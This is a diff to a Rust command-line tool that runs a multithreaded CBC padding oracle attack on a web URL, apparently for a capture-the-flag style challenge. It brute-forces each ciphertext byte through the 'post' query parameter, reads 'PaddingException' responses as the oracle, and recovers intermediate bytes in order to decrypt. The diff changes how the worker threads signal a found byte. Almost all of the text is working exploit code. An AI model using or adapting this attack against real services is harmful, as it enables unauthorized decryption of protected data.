@@ -90,18 +90,18 @@ fn main() -> Result<()> {
         .iter()
         .flatten()
         .for_each(|chunk| print!("{chunk:x?} "));
-    let mut orig_chunks = chunks.clone();
+    let orig_chunks = chunks.clone();
     let len = chunks.len();
-    let mut intermediates = [0u8; 16];
     let mut plaintext: Vec<Vec<u8>> = vec![];
     let url = Arc::new(args.url.clone());
+    let finished_condvar = Arc::new(Condvar::new());
+    let finished_b: Arc<Mutex<Option<u8>>> = Arc::new(Mutex::new(None));
     for chunk in 2..=10 {
         let mut intermediates = [0u8; 16];
         chunks = orig_chunks.clone();
         for i in 1u8..=16 {
             println!("chunk: #{}", len - chunk);
             println!("i: {i}");
-
             let mut handles = vec![];
             let semaphore = Arc::new(Semaphore::new(30));
             for b in 0u8..=255 {
@@ -109,7 +109,9 @@ fn main() -> Result<()> {
                 let mut chunks = chunks.clone();
                 let client = client.clone();
                 let semaphore = semaphore.clone();
-                let handle = std::thread::spawn(move || -> Option<u8> {
+                let finished_condvar = finished_condvar.clone();
+                let finished_b = finished_b.clone();
+                let handle = std::thread::spawn(move || {
                     {
                         let second_last = chunks.get_mut(len - chunk).unwrap();
                         second_last[16 - i as usize] = b;
@@ -136,55 +138,34 @@ fn main() -> Result<()> {
                         .replace('=', "~")
                         .replace('/', "!")
                         .replace('+', "-");
-                    // loop {
-                    //     {
-                    //         let mut lock = atomic.lock().ok()?;
-                    //         if *lock > 0 {
-                    //             *lock -= 1;
-                    //             break;
-                    //         }
-                    //     }
-                    //     sleep(Duration::from_millis(100));
-                    // }
                     let guard = semaphore.start();
-                    //sleep(Duration::from_millis(100));
                     let res = client
                         .get(url.as_str())
                         .query(&[("post", encoded)])
                         .send()
-                        .ok()?;
+                        .unwrap();
                     drop(guard);
-                    // {
-                    //     let mut lock = atomic.lock().ok()?;
-                    //     *lock += 1;
-                    // }
-                    let text = res.text().ok()?;
+                    let text = res.text().unwrap();
                     if text.contains("PaddingException") {
                         print!("{b} ");
                         io::stdout().flush().unwrap();
                     } else {
                         println!("\n{b} {text}");
-                        if text.contains("UnicodeDecodeError")
-                            || text.contains("ValueError")
-                            || i != 1
-                        {
-                            // println!("hit a Some!");
-                            return Some(b);
+                        if text.contains("UnicodeDecodeError") || text.contains("ValueError") {
+                            *(finished_b.lock().unwrap()) = Some(b);
+                            finished_condvar.notify_one();
                         }
                     }
-                    //println!("hit a None!");
-                    None
                 });
                 handles.push(handle);
             }
 
-            let mut b: Option<u8> = None;
-            for handle in handles {
-                if let Some(x) = handle.join().unwrap() {
-                    b = Some(x);
-                    break;
-                }
+            let mut b_guard = finished_b.lock().unwrap();
+            while (*b_guard).is_none() {
+                b_guard = finished_condvar.wait(b_guard).unwrap();
             }
+            let b = (*b_guard).take();
+            drop(b_guard);
             if let Some(b) = b {
                 // then continue here with the loop
                 intermediates[16 - i as usize] = b ^ i;
